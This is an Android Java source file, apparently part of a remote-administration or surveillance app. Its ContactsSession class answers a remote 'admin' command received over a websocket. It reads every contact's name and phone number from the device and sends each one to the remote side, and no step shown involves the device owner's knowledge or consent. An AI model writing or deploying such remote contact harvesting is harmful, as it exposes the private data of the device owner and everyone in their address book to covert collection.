package com.lyrnic.userside.sessions;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;

import com.lyrnic.userside.constants.Actions;
import com.lyrnic.userside.constants.Constants;
import com.lyrnic.userside.listeners.OnRequestSendMessageListener;
import com.lyrnic.userside.model.Contact;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashSet;

import okhttp3.WebSocket;

public class ContactsSession extends Session {
    public ContactsSession(Context context, String adminToken, OnRequestSendMessageListener onRequestSendMessageListener, int id) {
        super(context, adminToken, onRequestSendMessageListener, id);
    }

    @Override
    public void onMessageReceived(String message) {
        super.onMessageReceived(message);
        JSONObject jsonObject;
        try {
            jsonObject = new JSONObject(message);

            String action = jsonObject.getString(Constants.ACTION_KEY);
            if (action.equals(Actions.ACTION_REQUEST_CONTACTS)) {
                sendContacts();
            }
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

    private void sendContacts() {
        ArrayList<Contact> contactList = getContactList();

        for (Contact contact : contactList) {
            JSONObject jsonObject = new JSONObject();

            try {
                jsonObject.put(Constants.ACTION_KEY, Actions.ACTION_RECEIVE_CONTACT);
                jsonObject.put(Constants.CONTACT_NAME_KEY, contact.getName());
                jsonObject.put(Constants.CONTACT_NUMBER_KEY, contact.getPhoneNumber());
                sendMessage(jsonObject.toString());
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

    }


    private static final String[] PROJECTION = new String[]{
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
            ContactsContract.Contacts.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
    };

    private ArrayList<Contact> getContactList() {
        ArrayList<Contact> contactList = new ArrayList<>();
        ContentResolver cr = context.getContentResolver();

        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, PROJECTION, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
        if (cursor != null) {
            HashSet<String> mobileNoSet = new HashSet<>();
            try {
                final int nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
                final int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

                String name, number;
                while (cursor.moveToNext()) {
                    name = cursor.getString(nameIndex);
                    number = cursor.getString(numberIndex);
                    number = number.replace(" ", "");
                    if (!mobileNoSet.contains(number)) {
                        contactList.add(new Contact(name, number));
                        mobileNoSet.add(number);
                    }
                }
            } finally {
                cursor.close();
            }
        }
        return contactList;
    }
}
